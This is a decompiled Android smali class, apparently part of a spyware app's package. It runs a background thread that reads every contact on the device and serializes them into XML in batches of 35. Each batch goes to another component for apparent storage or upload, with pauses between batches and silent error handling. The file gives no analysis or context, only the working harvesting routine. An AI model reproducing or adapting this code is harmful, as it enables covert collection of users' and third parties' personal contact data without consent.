.class final Lcom/network/android/aa;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field final synthetic a:Landroid/content/Context;

.field final synthetic b:Landroid/content/ContentResolver;


# direct methods
.method constructor <init>(Landroid/content/Context;Landroid/content/ContentResolver;)V
    .locals 0

    iput-object p1, p0, Lcom/network/android/aa;->a:Landroid/content/Context;

    iput-object p2, p0, Lcom/network/android/aa;->b:Landroid/content/ContentResolver;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 8

    :try_start_0
    const-string v0, "asynContacts start"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Landroid/util/Xml;->newSerializer()Lorg/xmlpull/v1/XmlSerializer;

    move-result-object v7

    new-instance v6, Ljava/io/StringWriter;

    invoke-direct {v6}, Ljava/io/StringWriter;-><init>()V

    iget-object v0, p0, Lcom/network/android/aa;->a:Landroid/content/Context;

    invoke-static {v7, v6}, Lcom/network/android/SmsReceiver;->a(Lorg/xmlpull/v1/XmlSerializer;Ljava/io/StringWriter;)V

    iget-object v0, p0, Lcom/network/android/aa;->b:Landroid/content/ContentResolver;

    sget-object v1, Landroid/provider/ContactsContract$Contacts;->CONTENT_URI:Landroid/net/Uri;

    const/4 v2, 0x0

    const/4 v3, 0x0

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v3

    if-eqz v3, :cond_1

    const/4 v0, 0x0

    invoke-interface {v3}, Landroid/database/Cursor;->getCount()I

    move-result v1

    if-lez v1, :cond_1

    const-string v1, ""

    const-string v2, "contacts"

    invoke-interface {v7, v1, v2}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    move-object v1, v6

    move-object v2, v7

    :cond_0
    :goto_0
    invoke-interface {v3}, Landroid/database/Cursor;->moveToNext()Z

    move-result v4

    if-eqz v4, :cond_2

    add-int/lit8 v0, v0, 0x1

    iget-object v4, p0, Lcom/network/android/aa;->b:Landroid/content/ContentResolver;

    const-string v5, "add"

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {v2, v4, v3, v5, v6}, Lcom/network/android/m;->a(Lorg/xmlpull/v1/XmlSerializer;Landroid/content/ContentResolver;Landroid/database/Cursor;Ljava/lang/String;Ljava/lang/StringBuilder;)V

    rem-int/lit8 v4, v0, 0x23

    if-nez v4, :cond_0

    const-string v4, ""

    const-string v5, "contacts"

    invoke-interface {v2, v4, v5}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    invoke-static {v2}, Lcom/network/android/SmsReceiver;->a(Lorg/xmlpull/v1/XmlSerializer;)V

    const-string v2, "asynContacts Cut contacts"

    invoke-static {v2}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/StringWriter;->toString()Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lcom/network/android/aa;->a:Landroid/content/Context;

    invoke-static {v1, v2}, Lcom/network/android/j;->a(Ljava/lang/String;Landroid/content/Context;)V

    iget-object v1, p0, Lcom/network/android/aa;->a:Landroid/content/Context;

    invoke-static {v1}, Lcom/network/android/j;->a(Landroid/content/Context;)V

    const-wide/16 v1, 0x1e

    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V

    const-string v1, "asynContacts Cut contacts sleep: 30 count: count"

    invoke-static {v1}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {}, Landroid/util/Xml;->newSerializer()Lorg/xmlpull/v1/XmlSerializer;

    move-result-object v2

    new-instance v1, Ljava/io/StringWriter;

    invoke-direct {v1}, Ljava/io/StringWriter;-><init>()V

    invoke-static {v2, v1}, Lcom/network/android/SmsReceiver;->a(Lorg/xmlpull/v1/XmlSerializer;Ljava/io/StringWriter;)V

    const-string v4, ""

    const-string v5, "contacts"

    invoke-interface {v2, v4, v5}, Lorg/xmlpull/v1/XmlSerializer;->startTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "daump Exception- "

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1, v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;Ljava/lang/Throwable;)V

    const/4 v0, 0x1

    const/16 v1, -0x7d6

    invoke-static {v0, v1}, Lcom/network/android/c/a/b;->a(IS)V

    :cond_1
    :goto_1
    return-void

    :cond_2
    :try_start_1
    invoke-interface {v3}, Landroid/database/Cursor;->close()V

    const-string v0, ""

    const-string v3, "contacts"

    invoke-interface {v2, v0, v3}, Lorg/xmlpull/v1/XmlSerializer;->endTag(Ljava/lang/String;Ljava/lang/String;)Lorg/xmlpull/v1/XmlSerializer;

    const-string v0, "asynContacts End"

    invoke-static {v0}, Lcom/network/android/c/a/a;->a(Ljava/lang/String;)V

    invoke-static {v2}, Lcom/network/android/SmsReceiver;->a(Lorg/xmlpull/v1/XmlSerializer;)V

    invoke-virtual {v1}, Ljava/io/StringWriter;->toString()Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/network/android/aa;->a:Landroid/content/Context;

    invoke-static {v0, v1}, Lcom/network/android/j;->a(Ljava/lang/String;Landroid/content/Context;)V

    iget-object v0, p0, Lcom/network/android/aa;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/network/android/j;->a(Landroid/content/Context;)V
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_1
.end method
